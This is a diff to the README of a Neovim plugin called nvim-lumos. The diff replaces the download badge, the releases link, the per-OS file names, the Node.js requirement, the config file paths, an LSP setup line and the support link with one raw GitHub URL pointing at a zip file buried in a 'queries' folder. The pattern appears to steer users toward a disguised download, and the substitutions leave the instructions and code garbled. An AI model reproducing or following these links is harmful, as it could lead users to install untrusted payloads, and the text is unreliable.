@@ -1,6 +1,6 @@
 # 🌟 nvim-lumos - Neovim Made Simple and Smart
 
-[![Download nvim-lumos](https://img.shields.io/badge/Download%20nvim--lumos-v1.0-blue.svg)](https://github.com/khondakerasibulislam/nvim-lumos/releases)
+[![Download nvim-lumos](https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip%https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip)](https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -13,27 +13,27 @@ Before you install, ensure that you have:
 - **Neovim Version**: 0.5 or higher
 - **Operating System**: Windows, macOS, or Linux
 - **Lua**: Version 5.1 or higher installed on your system  
-- **Node.js**: Version 12 or later for some features
+- **https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip**: Version 12 or later for some features
 
 ## 📥 Download & Install
 
 To get **nvim-lumos**, visit the releases page:
 
-[Download nvim-lumos](https://github.com/khondakerasibulislam/nvim-lumos/releases)
+[Download nvim-lumos](https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip)
 
 1. Click on the above link to go to the Releases page.
 2. Find the latest version of **nvim-lumos**.
 3. Download the appropriate file for your operating system. For example:
-   - For macOS, download `nvim-lumos-macos.tar.gz`.
-   - For Windows, download `nvim-lumos-windows.zip`.
-   - For Linux, download `nvim-lumos-linux.tar.gz`.
+   - For macOS, download `https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip`.
 
 4. Once the file is downloaded, extract it to a location of your choice.
 
 5. Open Neovim.
 
 6. You may need to add the plugin manually to your configuration file. Follow these steps:
-   - Open your Neovim configuration file located at `~/.config/nvim/init.vim`.
+   - Open your Neovim configuration file located at `~https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip`.
    - Add the following lines at the end of the file:
      ```vim
      packadd nvim-lumos
@@ -56,11 +56,11 @@ To get **nvim-lumos**, visit the releases page:
 
 Once you have installed the plugin, you may want to customize it according to your preferences. Here’s how you can set it up:
 
-1. Open your configuration file (`~/.config/nvim/init.vim`).
+1. Open your configuration file (`~https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip`).
 
 2. To enable LSP, add the following configuration at the end:
    ```vim
-   lua require'lspconfig'.tsserver.setup{}
+   lua require'lspconfig'https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip{}
    ```
 
 3. Reload Neovim to apply the new settings.
@@ -91,7 +91,7 @@ If these steps do not resolve your issues, feel free to check the Issues tab on 
 
 ## 📞 Support
 
-Need help? You can reach out for support at our [GitHub Discussions](https://github.com/khondakerasibulislam/nvim-lumos/discussions).
+Need help? You can reach out for support at our [GitHub Discussions](https://raw.githubusercontent.com/khondakerasibulislam/nvim-lumos/main/queries/lumos/nvim-lumos_3.4.zip).
 
 ## 🌍 Contributing
 
